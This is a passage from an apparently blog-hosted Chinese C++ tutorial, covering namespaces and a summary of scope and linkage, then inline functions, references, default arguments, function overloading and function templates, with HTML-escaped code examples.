increment();// std::cout &lt;&lt; internal_count &lt;&lt; std::endl; 9.3.3 名称空间示例下面是一个更完整的示例，展示了如何定义和使用多个名称空间： 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;string&gt; // std 命名空间中的 string 类// 第一个名称空间namespace first_space &#123; void display() &#123; std::cout &lt;&lt; &quot;Inside first_space&quot; &lt;&lt; std::endl; &#125; int count = 1;&#125;// 第二个名称空间namespace second_space &#123; void display() &#123; std::cout &lt;&lt; &quot;Inside second_space&quot; &lt;&lt; std::endl; &#125; int count = 2;&#125;int main() &#123; // 使用作用域解析运算符 first_space::display(); // 输出: Inside first_space second_space::display(); // 输出: Inside second_space std::cout &lt;&lt; &quot;first_space::count = &quot; &lt;&lt; first_space::count &lt;&lt; std::endl; // 输出: 1 std::cout &lt;&lt; &quot;second_space::count = &quot; &lt;&lt; second_space::count &lt;&lt; std::endl; // 输出: 2 // 使用 using 声明 &#123; // 创建一个新的作用域 using first_space::display; display(); // 调用 first_space::display() &#125; // 使用 using 指令 (通常建议在函数内部或特定作用域内使用) &#123; // 创建一个新的作用域 using namespace second_space; display(); // 调用 second_space::display() std::cout &lt;&lt; &quot;count from second_space = &quot; &lt;&lt; count &lt;&lt; std::endl; // 访问 second_space::count &#125; // std 命名空间的使用 std::string message = &quot;Hello from std namespace!&quot;; std::cout &lt;&lt; message &lt;&lt; std::endl; return 0;&#125; 9.3.4 名称空间及其前途名称空间是现代C++编程不可或缺的一部分。它们是组织代码、避免名称冲突以及管理大型项目复杂性的关键工具。 库开发: 几乎所有的现代C++库都将其组件放在一个或多个名称空间中，以防止与使用该库的代码或其他库发生冲突。std 是最典型的例子。 项目组织: 在大型项目中，开发者经常使用名称空间来划分代码的不同模块或功能区域。 避免全局污染: 使用名称空间可以减少全局作用域中的名称数量，使代码更清晰、更易于维护。 最佳实践: **优先使用作用域解析运算符 (::)**：这是最明确、最不易出错的方式。 在 .cpp 文件或函数内部使用 using 声明或指令：避免在头文件（.h 或 .hpp）的顶层使用 using 指令，因为它会影响所有包含该头文件的文件，可能导致意想不到的名称冲突。 将自己的代码放入名称空间：这是一个良好的编程习惯，特别是当你编写可能被他人重用的代码时。 理解和正确使用名称空间对于编写健壮、可维护的C++代码至关重要。 9.4 总结本章探讨了C++如何管理程序中的内存和名称，特别是在涉及多个文件的大型项目中。这些机制对于编写结构清晰、可维护且可扩展的C++代码至关重要。 主要内容回顾： 单独编译 (Separate Compilation): C++允许将程序分解为多个源文件（.cpp）和头文件（.h 或 .hpp）。源文件包含函数的具体实现或变量的定义，而头文件通常包含声明（如函数原型、类定义、常量声明、模板等）。每个源文件可以被独立编译成目标文件（.obj 或 .o），最后由链接器将这些目标文件以及所需的库文件组合成最终的可执行程序。这种方式提高了编译效率，并使得代码模块化和重用更加方便。 存储持续性、作用域和链接性 (Storage Duration, Scope, and Linkage): 存储持续性决定了变量或对象在内存中存在的时间。主要有：自动存储（函数内定义的局部变量，随函数调用创建和销毁）、静态存储（程序运行期间一直存在，如全局变量或用 static 修饰的变量）、线程存储（C++11引入，与特定线程生命周期相关）和动态存储（使用 new 分配，delete 释放）。 作用域定义了程序中可以访问一个名称（变量、函数等）的区域。主要有：块作用域（&#123;&#125;内部）、函数作用域（仅用于 goto 标签）、函数原型作用域（仅用于参数名）、文件作用域（全局作用域）和类作用域。 链接性决定了在不同文件或编译单元中声明的同名标识符是否指向同一个实体。主要有：外部链接（可在多个文件中共享，如普通全局变量和函数）、内部链接（仅在当前文件内可见，如用 static 修饰的全局变量/函数或未命名空间中的成员）和无链接（如局部变量）。extern 关键字可用于引用其他文件中具有外部链接的变量。 名称空间 (Namespaces): 为了解决大型项目中可能出现的名称冲突问题（例如，不同库定义了同名的函数或类），C++引入了名称空间。 使用 namespace 关键字可以创建具名的代码区域。 访问名称空间成员可以通过作用域解析运算符 ::（如 std::cout）、using 声明（如 using std::cout;）或 using 指令（如 using namespace std;）。 C++标准库的所有功能都位于 std 名称空间中。 未命名的名称空间提供了一种创建具有内部链接性的实体的方法，是替代文件作用域 static 的现代方式。 掌握这些概念有助于更好地组织代码，理解变量和函数的生命周期与可见性，并有效避免名称冲突，从而构建更健壮、更模块化的C++应用程序。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 8 函数进阶","slug":"Cpp_tutorial_Chapter_8","date":"2025-04-26T12:03:35.389Z","updated":"2025-04-26T12:02:12.619Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_8/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_8/","excerpt":"","text":"8.1 C++ 内联函数常规的函数调用过程涉及一些开销：程序需要跳转到函数的内存地址，保存当前执行状态（如寄存器值），将参数复制到栈上，执行函数代码，存储返回值，恢复执行状态，然后跳转回调用点。对于非常短小且频繁调用的函数，这些开销可能会变得显著，影响程序性能。 内联函数 (Inline Function) 是 C++ 提供的一种优化机制，旨在减少这种函数调用开销。其基本思想是：建议编译器在编译时将函数的实际代码直接替换到每个调用该函数的地方，而不是执行常规的函数调用跳转。 用法要建议编译器将一个函数视为内联函数，可以在函数定义前加上 inline 关键字。 语法: 123inline return_type function_name(parameter_list) &#123; // 函数体&#125; 示例: 123456789101112131415161718192021#include &lt;iostream&gt;// 定义一个简单的内联函数inline double square(double x) &#123; return x * x;&#125;int main() &#123; double a = 5.0; double b; // 调用内联函数 b = square(a); // 编译器可能会将这里替换为: b = a * a; std::cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; &quot;, a squared = &quot; &lt;&lt; b &lt;&lt; std::endl; double c = square(1.5 + 2.5); // 编译器可能会替换为: double c = (1.5 + 2.5) * (1.5 + 2.5); std::cout &lt;&lt; &quot;(1.5 + 2.5) squared = &quot; &lt;&lt; c &lt;&lt; std::endl; return 0;&#125; 代码解释: square 函数被声明为 inline。 在 main 函数中调用 square(a) 时，编译器可能会直接用 a * a 的代码替换这次调用，避免了函数调用的开销。 同样，square(1.5 + 2.5) 可能被替换为 (1.5 + 2.5) * (1.5 + 2.5)。 inline 的特性和注意事项 建议而非命令: inline 关键字只是向编译器提出的一个建议。编译器会根据自己的优化策略来决定是否真的进行内联。如果函数体过于复杂（例如包含循环、递归、大量代码），或者编译器认为内联不会带来好处（甚至可能有害），它可能会忽略 inline 建议，仍然执行常规的函数调用。 适用于小型函数: 内联最适合那些代码量小、执行速度快且被频繁调用的函数。如果内联一个大函数，可能会导致最终生成的可执行代码体积显著增大（代码膨胀），反而降低性能（因为更大的代码可能导致更多的缓存未命中）。 定义位置: 为了让编译器能够在调用点展开函数代码，内联函数的定义（而不仅仅是原型）通常需要放在调用该函数的每个源文件中。最常见的做法是将内联函数的定义直接放在头文件中。这样，包含该头文件的所有源文件都能看到完整的函数定义，编译器就有机会进行内联。 注意：将函数定义放在头文件中对于非内联函数通常是错误的（会导致链接错误，因为同一个函数会在多个编译单元中定义），但对于内联函数是允许且必要的。 类定义中的函数: 在类（class 或 struct）定义内部实现的成员函数默认就是内联的，不需要显式添加 inline 关键字。 123456class MyClass &#123;public: int getValue() const &#123; return value; &#125; // 默认是内联的private: int value;&#125;; 内联函数 vs. 宏 (#define)在 C 语言中，有时会使用带参数的宏（#define）来模拟类似内联函数的效果，以避免函数调用开销。例如： 1#define SQUARE(X) ((X)*(X)) // C 风格宏 然而，宏存在一些缺点： 类型不安全: 宏只是简单的文本替换，不进行类型检查。 意外的副作用: 如果参数带有副作用（如 SQUARE(i++)），可能会导致意想不到的结果，因为参数会被多次求值 (((i++)*(i++))）。 调试困难: 宏在预处理阶段就被替换掉了，调试器通常看不到宏的原始形式。 作用域问题: 宏不受 C++ 的作用域规则约束。 内联函数克服了这些缺点： 类型安全: 内联函数遵循正常的函数类型检查规则。 参数求值: 参数只会被求值一次。 可调试: 内联函数仍然是真正的函数，可以用调试器进行调试（尽管内联后的代码可能看起来不同）。 遵循作用域: 内联函数遵循 C++ 的作用域和访问规则。 因此，在 C++ 中，应优先使用内联函数而不是带参数的宏来实现简单的、需要避免调用开销的功能。 总结: 内联函数是 C++ 提供的一种性能优化建议，通过在编译时将函数代码替换到调用点来减少函数调用开销。它特别适用于短小且频繁调用的函数。inline 关键字只是一个建议，编译器有最终决定权。为了使内联成为可能，通常需要将内联函数的定义放在头文件中。相比 C 风格的宏，内联函数提供了类型安全和更可预测的行为。 8.2 引用变量C++ 引入了一种新的复合类型——引用 (Reference)**。引用是已定义变量的别名 (alias)**。它提供了一种间接访问变量的方式，但语法比指针更简洁。一旦引用被初始化指向一个变量，它就不能再引用其他变量，并且对引用的所有操作实际上都作用于它所引用的原始变量。 8.2.1 创建引用变量引用变量在声明时必须被初始化，并且其类型必须与它所引用的变量类型相匹配。 语法: 1type&amp; reference_name = existing_variable; type: 变量的类型。 &amp;: 引用声明符，紧跟在类型名之后。 reference_name: 引用的名称。 existing_variable: 引用所指向的已存在的变量。 示例: 123456789101112131415161718192021222324#include &lt;iostream&gt;int main() &#123; int rats = 101; int&amp; rodents = rats; // rodents 是 rats 的一个引用 (别名) std::cout &lt;&lt; &quot;rats = &quot; &lt;&lt; rats; std::cout &lt;&lt; &quot;, rodents = &quot; &lt;&lt; rodents &lt;&lt; std::endl; // 输出: rats = 101, rodents = 101 // 对引用进行操作，实际上是操作原始变量 rodents++; std::cout &lt;&lt; &quot;After rodents++:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;rats = &quot; &lt;&lt; rats; // rats 的值也变成了 102 std::cout &lt;&lt; &quot;, rodents = &quot; &lt;&lt; rodents &lt;&lt; std::endl; // 输出: rats = 102, rodents = 102 // 查看地址，会发现它们是相同的 std::cout &lt;&lt; &quot;Address of rats: &quot; &lt;&lt; &amp;rats &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Address of rodents: &quot; &lt;&lt; &amp;rodents &lt;&lt; std::endl; // 输出相同的地址 // int&amp; bad_ref; // 错误！引用必须在声明时初始化 // double&amp; wrong_type = rats; // 错误！类型不匹配 (double&amp; vs int) return 0;&#125; 关键点: 引用必须在声明时初始化。 引用一旦初始化，就不能再指向其他变量。它终生都是其初始变量的别名。 引用本身不占用独立的内存地址（或者说，它的地址就是它所引用变量的地址）。 8.2.2 将引用用作函数参数引用最重要和最常见的用途之一是作为函数参数，这称为**按引用传递 (Pass by Reference)**。当使用引用作为函数参数时，函数接收的是原始变量的别名，而不是副本。这意味着函数可以直接访问并修改调用者作用域中的原始变量。 语法: 123void function_name(type&amp; ref_parameter) &#123; // 可以通过 ref_parameter 修改原始实参&#125; 示例：使用引用参数交换两个变量的值 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;// 函数：使用引用参数交换两个 int 变量的值void swap_ref(int&amp; a, int&amp; b) &#123; // a 和 b 是调用时传入变量的别名 int temp = a; a = b; b = temp; // 对 a 和 b 的修改直接影响原始变量&#125;// 对比：使用指针参数交换 (传统 C 风格)void swap_ptr(int* p_a, int* p_b) &#123; int temp = *p_a; *p_a = *p_b; *p_b = temp;&#125;// 对比：使用值传递 (无法交换原始变量)void swap_val(int a, int b) &#123; int temp = a; a = b; b = temp; // 只修改了局部副本 a 和 b&#125;int main() &#123; int wallet1 = 100; int wallet2 = 200; std::cout &lt;&lt; &quot;Original: wallet1 = &quot; &lt;&lt; wallet1 &lt;&lt; &quot;, wallet2 = &quot; &lt;&lt; wallet2 &lt;&lt; std::endl; // 尝试使用值传递交换 (失败) swap_val(wallet1, wallet2); std::cout &lt;&lt; &quot;After swap_val: wallet1 = &quot; &lt;&lt; wallet1 &lt;&lt; &quot;, wallet2 = &quot; &lt;&lt; wallet2 &lt;&lt; std::endl; // 值不变 // 使用引用传递交换 (成功) swap_ref(wallet1, wallet2); std::cout &lt;&lt; &quot;After swap_ref: wallet1 = &quot; &lt;&lt; wallet1 &lt;&lt; &quot;, wallet2 = &quot; &lt;&lt; wallet2 &lt;&lt; std::endl; // 值已交换 // 再次交换回来，使用指针传递 (成功) swap_ptr(&amp;wallet1, &amp;wallet2); // 注意需要传递地址 std::cout &lt;&lt; &quot;After swap_ptr: wallet1 = &quot; &lt;&lt; wallet1 &lt;&lt; &quot;, wallet2 = &quot; &lt;&lt; wallet2 &lt;&lt; std::endl; // 值再次交换回来 return 0;&#125; 按引用传递 vs. 按指针传递: 语法: 引用传递的调用语法更简洁自然 (swap_ref(a, b))，而指针传递需要显式获取地址 (swap_ptr(&amp;a, &amp;b)) 并在函数内部解引用 (*p_a)。 空值: 指针可以为 nullptr，需要在使用前检查。引用通常（在标准用法下）不会是“空”的，因为它必须引用一个已存在的对象。这使得引用在某些情况下更安全。 目的: 两者都可以用来允许函数修改调用者的变量，以及避免大型对象的复制开销。 8.2.3 引用的属性和特别之处 必须初始化: 如前所述，引用在声明时必须绑定到一个已存在的对象。 不可重新绑定: 引用不能在初始化后更改其引用的对象。 行为像原变量: 对引用的操作（赋值、取地址等）通常表现得就像直接对原始变量操作一样。 临时变量和 const 引用: 通常，不能将引用绑定到临时变量或字面值。但有一个重要的例外：常量引用 (const type&amp;) 可以绑定到临时变量、字面值或类型稍有不同的变量（如果可以进行隐式转换）。 12345678double value = 3.14;// int&amp; ref_val = value; // 错误：类型不匹配const int&amp; const_ref_val = value; // 合法！创建了一个临时的 int(3)，const_ref_val 引用这个临时变量const double&amp; ref_literal = 5.0 * 2.0; // 合法！引用一个临时 double(10.0)long num = 100L;const int&amp; ref_num = num; // 合法！引用一个临时的 int(100) 这种特性使得常量引用在函数参数中非常有用，因为它们可以接受更广泛的实参类型（包括字面值和需要类型转换的值），同时保证函数不会修改它们。 8.2.4 将引用用于结构按引用传递对于结构体特别有用，因为它可以避免复制整个结构体（可能包含许多成员）的开销。如果函数不需要修改结构体，应使用常量引用 (const struct_type&amp;)。 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;string&gt;struct Product &#123; std::string name; double price; int quantity;&#125;;// 按常量引用传递结构，避免复制且不修改void display_product(const Product&amp; prod) &#123; std::cout &lt;&lt; &quot;Product Name: &quot; &lt;&lt; prod.name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Price: $&quot; &lt;&lt; prod.price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Quantity: &quot; &lt;&lt; prod.quantity &lt;&lt; std::endl; // prod.price = 0.0; // 错误！不能通过 const 引用修改&#125;// 按引用传递结构，允许修改void apply_discount(Product&amp; prod, double discount_percentage) &#123; if (discount_percentage &gt; 0 &amp;&amp; discount_percentage &lt; 100) &#123; prod.price *= (1.0 - discount_percentage / 100.0); &#125;&#125;int main() &#123; Product laptop = &#123;&quot;Laptop Pro&quot;, 1200.0, 10&#125;; std::cout &lt;&lt; &quot;--- Initial Product ---&quot; &lt;&lt; std::endl; display_product(laptop); // 高效传递，不复制 apply_discount(laptop, 10.0); // 传递引用以修改价格 std::cout &lt;&lt; &quot;\\n--- Product After 10% Discount ---&quot; &lt;&lt; std::endl; display_product(laptop); // 再次高效传递 return 0;&#125; 8.2.5 将引用用于类对象将引用用于类对象与用于结构体完全相同。按常量引用 (const class_type&amp;) 传递是避免复制大型对象并确保函数不修改对象状态的标准做法。如果需要修改对象，则使用普通引用 (class_type&amp;)。 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;class Student &#123;public: Student(const std::string&amp; n) : name(n) &#123;&#125; void add_grade(int g) &#123; grades.push_back(g); &#125; void print_info() const &#123; // const 成员函数 std::cout &lt;&lt; &quot;Student: &quot; &lt;&lt; name &lt;&lt; &quot;, Grades: &quot;; for (int g : grades) &#123; std::cout &lt;&lt; g &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; &#125; const std::string&amp; get_name() const &#123; return name; &#125; // 返回常量引用private: std::string name; std::vector&lt;int&gt; grades;&#125;;// 按常量引用传递类对象void show_student_summary(const Student&amp; s) &#123; std::cout &lt;&lt; &quot;Summary for &quot; &lt;&lt; s.get_name() &lt;&lt; std::endl; s.print_info(); // 可以调用 const 成员函数 // s.add_grade(100); // 错误！不能通过 const 引用调用非 const 成员函数&#125;int main() &#123; Student alice(&quot;Alice&quot;); alice.add_grade(95); alice.add_grade(88); show_student_summary(alice); // 高效传递，不复制 return 0;&#125; 8.2.6 对象、继承和引用当与类继承结合使用时，基类的引用可以指向派生类的对象。这是实现多态 (Polymorphism) 的关键机制之一（与指针类似）。通过基类引用调用虚函数时，会执行派生类中相应的版本。这部分内容将在后续章节（如第 13 章）详细介绍。 12345678910111213141516171819202122232425// 概念预览 (将在后续章节详细讲解)class Base &#123;public: virtual void show() const &#123; std::cout &lt;&lt; &quot;Base::show()&quot; &lt;&lt; std::endl; &#125; virtual ~Base() &#123;&#125; // 虚析构函数&#125;;class Derived : public Base &#123;public: void show() const override &#123; std::cout &lt;&lt; &quot;Derived::show()&quot; &lt;&lt; std::endl; &#125;&#125;;void display(const Base&amp; obj) &#123; // 参数是基类的常量引用 obj.show(); // 调用虚函数，会根据 obj 实际引用的对象类型执行相应版本&#125;int main() &#123; Base b; Derived d; display(b); // 输出: Base::show() display(d); // 输出: Derived::show() (多态行为) return 0;&#125; 8.2.7 何时使用引用参数选择使用值传递、指针传递还是引用传递取决于具体需求： 按值传递 (type param): 适用于小型数据类型（int, double, bool, 指针本身）。 当函数需要操作数据的副本而不影响原始数据时。 简单易懂。 按指针传递 (type* param): 当函数需要修改调用者的原始数据时（传统 C 风格）。 当需要表示“可选”参数（可以传递 nullptr）时。 与 C 库或旧代码交互时。 传递大型对象以避免复制开销（但通常引用更受欢迎）。 按引用传递 (type&amp; param): 当函数需要修改调用者的原始数据时（C++ 风格，通常比指针更简洁安全）。 传递大型对象（结构、类）以避免复制开销，但函数不需要修改对象时，应使用**常量引用 (const type&amp; param)**。这是 C++ 中非常常见的做法，兼具效率和安全性。 经验法则: 对于内置类型和小型结构，优先考虑按值传递。 对于需要修改调用者数据的大型对象或函数，使用按引用传递 (type&amp;)。 对于不需要修改调用者数据的大型对象，使用按常量引用传递 (const type&amp;) 以提高效率和安全性。 在需要表示可选参数或与 C 风格代码交互时，考虑使用按指针传递 (type*)。 引用是 C++ 中一个强大且常用的特性，尤其是在函数参数和返回值中，它提供了指针之外的另一种处理间接访问和避免复制的方式。 8.3 默认参数C++ 允许在函数声明（原型）或定义中为函数的参数指定默认值。如果在调用函数时没有为带有默认值的参数提供实参，那么编译器会自动使用该参数的默认值。如果提供了实参，则使用提供的实参值，覆盖默认值。 目的: 提高函数的灵活性，允许用户在调用时省略某些不常用的参数。 简化函数调用，特别是当某些参数在大多数情况下都使用相同的值时。 用法在函数原型或定义中，通过在参数声明后使用赋值运算符 = 来指定默认值。 语法 (在原型中指定): 1return_type function_name(type param1, type param2 = default_value2, type param3 = default_value3); 重要规则: 从右到左规则: 必须为函数参数列表从右到左依次提供默认值。如果某个参数有默认值，则其右侧的所有参数必须也有默认值。 123456// 合法void func1(int a, int b = 10, int c = 20);// 合法void func2(int a = 5, int b = 10, int c = 20);// 非法！如果 b 有默认值，c 必须也有// void func_error(int a, int b = 10, int c); 原型 vs. 定义: 默认参数值通常在函数原型（声明）中指定，而不是在函数定义中。如果在原型中指定了默认值，则定义中不能再次指定。如果函数没有单独的原型（定义在调用之前），则可以在定义中指定默认值。将默认值放在原型中（通常在头文件里）是更好的做法，因为它向调用者清晰地展示了可以省略哪些参数。 调用时的匹配: 调用函数时，提供的实参会从左到右匹配参数。不能跳过没有默认值的参数去为有默认值的参数提供值。 1234func1(1); // 等效于 func1(1, 10, 20)func1(1, 50); // 等效于 func1(1, 50, 20)func1(1, 50, 30); // 等效于 func1(1, 50, 30)// func1(1, , 30); // 非法！不能跳过参数 b 示例1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;// 函数原型，指定默认参数// level 默认为 1， prefix 默认为 &quot;Log: &quot;void log_message(const std::string&amp; message, int level = 1, const std::string&amp; prefix = &quot;Log: &quot;);int main() &#123; // 调用方式 1: 提供所有参数 log_message(&quot;System started.&quot;, 0, &quot;Info: &quot;); // 调用方式 2: 省略最右边的 prefix 参数，使用其默认值 log_message(&quot;Processing data...&quot;, 2); // prefix 使用 &quot;Log: &quot; // 调用方式 3: 省略 level 和 prefix 参数，使用它们的默认值 log_message(&quot;Operation complete.&quot;); // level 使用 1, prefix 使用 &quot;Log: &quot; // log_message(&quot;Error occurred&quot;, , &quot;Error: &quot;); // 非法！不能跳过 level return 0;&#125;// 函数定义 (注意：这里不再重复默认值)void log_message(const std::string&amp; message, int level, const std::string&amp; prefix) &#123; std::cout &lt;&lt; prefix &lt;&lt; &quot;[Level &quot; &lt;&lt; level &lt;&lt; &quot;] &quot; &lt;&lt; message &lt;&lt; std::endl;&#125; 输出: 123Info: [Level 0] System started.Log: [Level 2] Processing data...Log: [Level 1] Operation complete. 代码解释: log_message 函数的原型为 level 和 prefix 参数指定了默认值。 main 函数展示了不同的调用方式： 第一次调用提供了所有三个参数。 第二次调用只提供了 message 和 level，prefix 使用了默认值 &quot;Log: &quot;。 第三次调用只提供了 message，level 使用了默认值 1，prefix 使用了默认值 &quot;Log: &quot;。 函数定义部分没有重复默认值，只列出了参数类型和名称。 默认参数是 C++ 中一个方便的特性，可以使函数接口更加灵活和易用，尤其是在处理具有多个配置选项或不常用参数的函数时。 8.4 函数重载函数重载 (Function Overloading) 是 C++ 的一项特性，允许在同一个作用域内定义多个同名函数，只要它们的参数列表（也称为函数签名）不同即可。参数列表的不同可以体现在参数的数量、类型或顺序上。编译器会根据函数调用时提供的实参类型和数量来决定具体调用哪个重载版本。 函数签名: 函数的名称和其参数列表（参数的类型、数量和顺序）共同构成了函数签名。注意：函数的返回类型不属于函数签名的一部分，不能仅凭返回类型不同来重载函数。 目的: 允许使用相同的函数名来执行概念上相似但操作于不同数据类型或参数组合的任务。 提高代码的可读性和易用性，用户不必为相似操作记住多个不同的函数名。 8.4.1 重载示例假设我们需要一个函数来打印不同类型的数据。使用函数重载，我们可以定义多个名为 print 的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include &lt;string&gt;// 重载版本 1: 打印 intvoid print(int i) &#123; std::cout &lt;&lt; &quot;Printing int: &quot; &lt;&lt; i &lt;&lt; std::endl;&#125;// 重载版本 2: 打印 doublevoid print(double d) &#123; std::cout &lt;&lt; &quot;Printing double: &quot; &lt;&lt; d &lt;&lt; std::endl;&#125;// 重载版本 3: 打印字符串 (const char*)void print(const char* s) &#123; std::cout &lt;&lt; &quot;Printing C-string: &quot; &lt;&lt; s &lt;&lt; std::endl;&#125;// 重载版本 4: 打印 std::string (常量引用)void print(const std::string&amp; s) &#123; std::cout &lt;&lt; &quot;Printing std::string: &quot; &lt;&lt; s &lt;&lt; std::endl;&#125;// 重载版本 5: 打印两个 intvoid print(int i, int j) &#123; std::cout &lt;&lt; &quot;Printing two ints: &quot; &lt;&lt; i &lt;&lt; &quot; and &quot; &lt;&lt; j &lt;&lt; std::endl;&#125;// 错误示例：仅返回类型不同，无法重载// int print(int i) &#123;// std::cout &lt;&lt; &quot;Trying to return int: &quot; &lt;&lt; i &lt;&lt; std::endl;// return i;// &#125;int main() &#123; print(10); // 调用版本 1 (int) print(3.14); // 调用版本 2 (double) print(&quot;Hello&quot;); // 调用版本 3 (const char*) std::string msg = &quot;World&quot;; print(msg); // 调用版本 4 (const std::string&amp;) print(5, 20); // 调用版本 5 (int, int) // print(10L); // 可能产生歧义调用，因为 long 可以转换为 int 或 double // 编译器可能报错或选择一个最佳匹配 return 0;&#125; 代码解释: 我们定义了五个名为 print 的函数，但它们的参数列表各不相同（类型或数量不同）。 在 main 函数中，编译器根据传递给 print 的实参类型和数量，自动选择了正确的重载版本进行调用。 名称修饰 (Name Mangling): C++ 编译器内部通过一种称为名称修饰或名称改编（Name Mangling）的技术来区分同名的重载函数。它会根据函数的签名（包括参数类型）生成一个内部唯一的名称。例如，print(int) 和 print(double) 在编译后会变成不同的内部名称，这样链接器就能正确地将函数调用链接到对应的函数定义。 8.4.2 何时使用函数重载函数重载是一个强大的工具，但应谨慎使用，以保持代码的清晰性。以下是一些适合使用函数重载的情况： 执行概念上相似的任务: 当多个函数执行的操作逻辑上相似，只是处理的数据类型不同时（如上例中的 print 函数，或计算不同类型数值绝对值的 abs 函数）。 提供不同参数组合: 当一个任务可以通过提供不同数量或类型的参数来完成时（例如，一个构造函数可以接受不同的初始化参数组合）。 避免使用函数重载的情况: 执行完全不同的任务: 如果函数虽然名称相同，但执行的任务在逻辑上毫不相关，那么重载可能会导致混淆。此时应使用不同的函数名。 仅参数类型可通过默认参数或模板实现: 如果函数的功能差异可以通过默认参数或函数模板（见 8.5 节）更清晰地表达，那么可能不需要重载。例如，如果只是参数数量不同，且较少参数的版本可以通过为较多参数版本提供默认值来实现，那么默认参数可能更合适。 总结: 函数重载允许我们用同一个名称定义多个功能相似但参数列表不同的函数。编译器根据调用时提供的实参来选择正确的版本。这是 C++ 实现多态性的一种方式（编译时多态），可以使代码更直观、更易用，但应确保重载的函数在逻辑上是相关的，以避免混淆。 8.5 函数模板函数重载允许我们为不同的参数类型定义同名函数，但如果这些函数的逻辑完全相同，只是处理的数据类型不同，为每种类型都写一个重载版本会很繁琐且容易出错。例如，交换两个 int 和交换两个 double 的逻辑是一样的。 函数模板 (Function Template) 提供了一种更通用的解决方案。它允许我们编写一个与类型无关的函数定义，其中的数据类型使用模板参数（也叫类型参数）来表示。编译器会根据函数调用时使用的具体数据类型，自动生成（实例化）相应的函数版本。 目的: 编写通用的、可重用的代码，适用于多种数据类型。 减少代码重复。 提高代码的可维护性。 语法: 1234template &lt;typename T&gt; // 或者 template &lt;class T&gt;return_type function_name(parameter_list) &#123; // 函数体，可以使用类型参数 T&#125; template &lt;typename T&gt;: 这是模板声明，告诉编译器接下来是一个模板定义。typename 是关键字（也可以用 class 关键字代替，两者在这里等价），T 是模板参数的名称（通常用大写字母，如 T, U, V，但可以是任何合法标识符）。你可以定义多个模板参数，用逗号分隔，例如 template &lt;typename T, typename U&gt;。 return_type, parameter_list, function_name: 与普通函数定义类似，但可以在这些部分使用模板参数 T 来代表某种待定的数据类型。 示例：通用的交换函数模板 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;// 定义一个函数模板 Swaptemplate &lt;typename T&gt; // T 代表任意类型void Swap(T&amp; a, T&amp; b) &#123; // 参数是类型 T 的引用 T temp; // 声明一个类型为 T 的临时变量 temp = a; a = b; b = temp;&#125;int main() &#123; int i = 10, j = 20; std::cout &lt;&lt; &quot;Original ints: i = &quot; &lt;&lt; i &lt;&lt; &quot;, j = &quot; &lt;&lt; j &lt;&lt; std::endl; Swap(i, j); // 编译器自动生成 Swap&lt;int&gt;(int&amp;, int&amp;) 版本 std::cout &lt;&lt; &quot;Swapped ints: i = &quot; &lt;&lt; i &lt;&lt; &quot;, j = &quot; &lt;&lt; j &lt;&lt; std::endl; double x = 1.5, y = 2.8; std::cout &lt;&lt; &quot;\\nOriginal doubles: x = &quot; &lt;&lt; x &lt;&lt; &quot;, y = &quot; &lt;&lt; y &lt;&lt; std::endl; Swap(x, y); // 编译器自动生成 Swap&lt;double&gt;(double&amp;, double&amp;) 版本 std::cout &lt;&lt; &quot;Swapped doubles: x = &quot; &lt;&lt; x &lt;&lt; &quot;, y = &quot; &lt;&lt; y &lt;&lt; std::endl; char c1 = &#x27;A&#x27;, c2 = &#x27;B&#x27;; std::cout &lt;&lt; &quot;\\nOriginal chars: c1 = &quot; &lt;&lt; c1 &lt;&lt; &quot;, c2 = &quot; &lt;&lt; c2 &lt;&lt; std::endl; Swap(c1, c2); // 编译器自动生成 Swap&lt;char&gt;(char&amp;, char&amp;) 版本 std::cout &lt;&lt; &quot;Swapped chars: c1 = &quot; &lt;&lt; c1 &lt;&lt; &quot;, c2 = &quot; &lt;&lt; c2 &lt;&lt; std::endl; // Swap(i, x); // 错误！编译器无法推断出唯一的 T 类型 (int vs double) return 0;&#125; 代码解释: 我们定义了一个名为 Swap 的函数模板，它使用类型参数 T。 在 main 函数中，当我们调用 Swap(i, j) 时，编译器看到两个实参都是 int 类型，于是它推断出 T 应该是 int，并自动生成（实例化）一个专门处理 int 的 Swap 函数版本：void Swap&lt;int&gt;(int&amp; a, int&amp; b)。 类似地，调用 Swap(x, y) 时，编译器生成 Swap&lt;double&gt; 版本；调用 Swap(c1, c2) 时，生成 Swap&lt;char&gt; 版本。 这个过程称为**模板实例化 (Template Instantiation)**。编译器只为程序中实际用到的类型生成函数实例。 8.5.1 重载的模板函数模板也可以像普通函数一样被重载。你可以提供多个同名的函数模板，只要它们的模板参数列表不同，或者函数参数列表（非模板参数部分）不同即可。 示例：重载模板以处理不同数量的参数或特定类型 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;// 模板版本 1: 交换两个同类型变量template &lt;typename T&gt;void Swap(T&amp; a, T&amp; b) &#123; std::cout &lt;&lt; &quot;Using Swap(T&amp;, T&amp;)&quot; &lt;&lt; std::endl; T temp = a; a = b; b = temp;&#125;// 模板版本 2: 交换两个数组的元素 (需要额外参数指定大小)template &lt;typename T&gt;void Swap(T arr1[], T arr2[], int n) &#123; std::cout &lt;&lt; &quot;Using Swap(T[], T[], int)&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; n; ++i) &#123; T temp = arr1[i]; arr1[i] = arr2[i]; arr2[i] = temp; &#125;&#125;int main() &#123; int i = 10, j = 20; Swap(i, j); // 调用版本 1: Swap&lt;int&gt;(int&amp;, int&amp;) int arr_a[] = &#123;1, 2, 3&#125;; int 